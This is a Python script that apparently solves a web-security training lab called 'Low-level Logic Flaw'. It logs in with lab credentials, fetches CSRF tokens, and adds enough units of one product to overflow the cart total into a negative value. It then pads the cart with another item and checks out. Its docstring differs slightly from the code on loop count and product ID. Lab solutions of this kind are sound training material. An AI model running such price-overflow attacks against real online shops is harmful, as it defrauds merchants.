"""
    Lab: Low-level Logic Flaw

    Exploitation Steps:
    1. Retrieve the CSRF token for login
    2. Log in as 'wiener:peter' using the CSRF token
    3. Add 99 units of productId=1 to the cart, 323 times
    4. Add 47 more units of productId=1
    5. Add a product (e.g., productId=5) with a quantity that brings the total just under $100
    6. Retrieve a new CSRF token to confirm the order
    7. Confirm the order
    8. Load the home page

    Author: N00BCYB0T
"""

import argparse
import re
import time
from decimal import Decimal, ROUND_HALF_UP
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False
   
    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
    response = fetch(session, '/login')
    csrf_token = get_csrf(response.text)

    print(f"{Fore.YELLOW}Logging in as 'wiener'...{Fore.RESET}")
    data = { 
        "csrf": csrf_token,
        "username": "wiener", 
        "password": "peter" 
    }
    login(session, data)
    print(f"{Fore.GREEN}[+] Logged in!{Fore.RESET}")

    print(f"{Fore.YELLOW}Placing orders for product 1...{Fore.RESET}")
    data = {
        "productId": 1, 
        "redir": "PRODUCT",
        "quantity": 99,
    }
    for i in range(324):
        print(f"Attempt: {Fore.BLUE}{i+1}{Fore.RESET}", end="\r", flush=True)
        place_order(session, data)
    
    data['quantity'] = 47
    place_order(session, data)
    price = check_price(session)

    print(f"{Fore.YELLOW}Placing an order for product 2 to establish the price....{Fore.RESET}")
        
    data = {
        "productId": 10, 
        "redir": "PRODUCT",
        "quantity": 14,
    }
    place_order(session, data)

    price = check_price(session)
    data = {
            "productId": 10, 
            "redir": "PRODUCT",
            "quantity": 1,
        }
    while price < 0:
        place_order(session, data)
        price = check_price(session)

    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
    response = fetch(session, '/cart')
    csrf_token2 = get_csrf(response.text)

    print(f"{Fore.YELLOW}Checking out...{Fore.RESET}")
    data = { "csrf": csrf_token2 }
    checkout(session, data)

    r = fetch(session, '/my-account')

    response = fetch(session, '/cart/order-confirmation?order-confirmed=true')
    if response.status_code == 200:
        if "Congratulations, you solved the lab!" in response.text:
            print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")
            exit(1)
    print(f"{Fore.RED}[-] Lab not solved!{Fore.RESET}")

def fetch(session, path):
    try:
        return session.get(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

def get_csrf(text):
    csrf_matches = re.search(r"csrf\" value=\"(.+)\"", text)
    if not csrf_matches:
        print(f"{Fore.RED}[-] CSRF Token not found!{Fore.RESET}")
        exit(1)
    csrf_token = csrf_matches.group(1)
    print(f"{Fore.GREEN}[+] Found CSRF Token: {csrf_token}{Fore.RESET}")
    return csrf_token

def check_price(session):
    response = fetch(session, "/cart")
    match = re.search(r"Total:\s*</th>\s*<th>\s*([-\$0-9.,]+)", response.text)
    if not match:
        print(f"{Fore.RED}[-] Could not find total price in cart!{Fore.RESET}")
        exit(1)
    total_str = match.group(1).replace("$", "").replace(",", ".")
    total = Decimal(total_str).to_integral_value(rounding=ROUND_HALF_UP)
    print(f"{Fore.CYAN}[*] Cart total: {total}{Fore.RESET}")
    return int(total)

def login(session, data):
    try:
        session.post(f"{URL}/login", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to login as {data['username']} through exception{Fore.RESET}")
        exit(1)

def place_order(session, data):
    try:
        session.post(
            f"{URL}/cart", 
            data=data, 
            allow_redirects=False
        )
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to place order through exception: {e}{Fore.RESET}")
        exit(1)

def checkout(session, data):
    try:
        session.post(
            f"{URL}/cart/checkout", 
            data=data, 
            allow_redirects=False
        )
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to place order through exception: {e}{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()